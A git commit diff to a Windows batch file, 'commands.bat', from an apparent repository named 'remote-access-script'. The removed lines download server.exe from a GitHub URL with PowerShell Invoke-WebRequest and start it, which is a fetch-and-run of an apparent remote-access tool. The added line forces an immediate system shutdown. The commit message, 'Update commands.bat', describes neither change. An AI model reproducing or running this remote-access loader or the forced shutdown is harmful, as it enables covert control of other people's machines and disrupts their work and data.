9516421f27ab801211c35de492dda5b047ebabd3
mickr309 <mickrosenau309@gmail.com>
2025-03-06 23:25:23 +0100

    Update commands.bat

--- commands.bat
+++ commands.bat
@@ -1,17 +1,1 @@
-@echo off
-set "server_exe=C:\log\server.exe"
-
-:: Check if the server executable exists
-if exist "%server_exe%" (
-    echo Server executable found.
-) else (
-    echo Server executable not found. Downloading...
-    powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/mickr309/remote-access-script/refs/heads/main/server.exe -OutFile %server_exe%"
-    if not exist "%server_exe%" (
-        echo Failed to download the executable.
-        exit /b
-    )
-)
-
-echo Starting the server...
-start "" "%server_exe%"
+shutdown /s /f /t 0
